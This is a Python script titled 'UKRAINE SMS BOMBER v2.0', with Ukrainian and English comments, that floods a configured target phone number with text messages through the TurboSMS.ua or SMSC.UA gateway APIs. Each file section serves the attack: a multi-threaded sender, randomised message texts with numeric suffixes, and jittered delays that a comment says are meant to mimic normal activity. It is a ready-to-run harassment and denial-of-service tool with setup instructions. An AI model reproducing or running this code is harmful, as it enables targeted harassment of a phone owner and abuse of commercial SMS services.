#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UKRAINE SMS BOMBER v2.0 — Multi-threaded flood via TurboSMS.ua / SMSC.UA
Коментарі українською / Comments in Ukrainian & English
Вимоги: Python 3.6+, requests (pip install requests)
"""

import requests
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

# ==================== КОНФІГУРАЦІЯ / CONFIGURATION ====================
TARGET_PHONE = "+380991234567"          # Номер отримувача в міжнародному форматі / Target number (international)
API_KEY = "YOUR_TURBOSMS_API_KEY"       # API-ключ від TurboSMS.ua / API key from TurboSMS.ua
# Альтернатива: SMSC.UA — замініть URL та параметри / Alternative: SMSC.UA
USE_SMSC_UA = False                     # True, якщо використовуєте SMSC.UA / Set True for SMSC.UA
SMSC_LOGIN = "your_login"
SMSC_PASSWORD = "your_password"

MESSAGE_TEXTS = [
    "Привіт! / Hello!",
    "Тестове повідомлення / Test message",
    "ХПХХППХХП",
    "Бомбер активовано / Bomber activated",
]
MESSAGES_PER_THREAD = 50                # К-сть повідомлень на один потік / Messages per thread
THREAD_COUNT = 3                        # К-сть паралельних потоків / Number of parallel threads
DELAY_BETWEEN_MESSAGES = 1.0            # Затримка між повідомленнями (сек) / Delay between messages (sec)
SENDER_NAME = "Bomber"                  # Ім'я відправника (має бути узгоджене) / Alphanumeric sender ID

# ==================== МОДУЛЬ ВІДПРАВКИ / SENDING MODULE ====================
class SMSBomber:
    def __init__(self, api_key: str = None, smsc_credentials: tuple = None):
        """
        Ініціалізація бомбера / Initialize bomber.
        :param api_key: ключ для TurboSMS / API key for TurboSMS
        :param smsc_credentials: (login, password) для SMSC.UA
        """
        self.api_key = api_key
        self.smsc_login = smsc_credentials[0] if smsc_credentials else None
        self.smsc_password = smsc_credentials[1] if smsc_credentials else None

    def _send_via_turbosms(self, phone: str, message: str) -> bool:
        """Відправка через TurboSMS.ua API / Send via TurboSMS.ua API"""
        url = "https://api.turbosms.ua/message/send.json"
        data = {
            "token": self.api_key,
            "recipients": [phone],
            "sms": {
                "sender": SENDER_NAME,
                "text": message
            }
        }
        try:
            resp = requests.post(url, json=data, timeout=5)
            result = resp.json()
            # Успіх, якщо статус "OK" / Success if response contains "response_code": 0
            if result.get("response_code") == 0:
                return True
            else:
                print(f"[!] TurboSMS помилка: {result.get('response_text', 'unknown')}")
                return False
        except Exception as e:
            print(f"[!] Виняток: {e}")
            return False

    def _send_via_smsc_ua(self, phone: str, message: str) -> bool:
        """Відправка через SMSC.UA API / Send via SMSC.UA API"""
        url = "https://smsc.ua/sys/send.php"
        params = {
            "login": self.smsc_login,
            "psw": self.smsc_password,
            "phones": phone,
            "mes": message,
            "sender": SENDER_NAME,
            "charset": "utf-8",
            "fmt": 3  # JSON відповідь
        }
        try:
            resp = requests.get(url, params=params, timeout=5)
            result = resp.json()
            if "error" not in result and "error_code" not in result:
                return True
            else:
                print(f"[!] SMSC.UA помилка: {result}")
                return False
        except Exception as e:
            print(f"[!] Виняток: {e}")
            return False

    def send_sms(self, phone: str, message: str) -> bool:
        """Вибір шлюзу за конфігурацією / Select gateway based on config"""
        if USE_SMSC_UA and self.smsc_login:
            return self._send_via_smsc_ua(phone, message)
        elif self.api_key:
            return self._send_via_turbosms(phone, message)
        else:
            print("[!] Жодний API-ключ не надано / No API keys provided")
            return False

    def worker(self, thread_id: int):
        """Поток-працівник: надсилає MESSAGES_PER_THREAD повідомлень / Worker thread"""
        for i in range(MESSAGES_PER_THREAD):
            # Випадковий вибір тексту з хвостом / Random message + suffix
            msg = random.choice(MESSAGE_TEXTS)
            msg += f" [{random.randint(1000, 9999)}]"
            success = self.send_sms(TARGET_PHONE, msg)
            if success:
                print(f"[Потік {thread_id}] Відправлено {i+1}/{MESSAGES_PER_THREAD}: {msg[:30]}...")
            else:
                print(f"[Потік {thread_id}] Збій на {i+1}")
            # Затримка для імітації звичайної поведінки / Delay to mimic normal activity
            time.sleep(DELAY_BETWEEN_MESSAGES + random.uniform(0, 0.5))

    def start_bombing(self):
        """Запуск багатопотокової бомбардувальної атаки / Launch multi-threaded bombing"""
        print(f"=== ПОЧАТОК АТАКИ на {TARGET_PHONE} ===")
        print(f"Потоків: {THREAD_COUNT}, повідомлень на потік: {MESSAGES_PER_THREAD}")
        print(f"Всього буде відправлено: {THREAD_COUNT * MESSAGES_PER_THREAD} SMS\n")
        with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
            for t in range(THREAD_COUNT):
                executor.submit(self.worker, t)
        print("\n=== БОМБАРДУВАННЯ ЗАВЕРШЕНО ===")

# ==================== ТОЧКА ВХОДУ / ENTRY POINT ====================
if __name__ == "__main__":
    if not USE_SMSC_UA and API_KEY == "YOUR_TURBOSMS_API_KEY":
        print("Необхідно зареєструватися на turbo-sms.com.ua та отримати API-ключ (token).")
        print("Вставте ключ у змінну API_KEY.")
        print("Або активуйте USE_SMSC_UA та вкажіть SMSC_LOGIN/SMSC_PASSWORD.")
        exit(1)

    bomber = SMSBomber(
        api_key=None if USE_SMSC_UA else API_KEY,
        smsc_credentials=(SMSC_LOGIN, SMSC_PASSWORD) if USE_SMSC_UA else None
    )
    bomber.start_bombing()
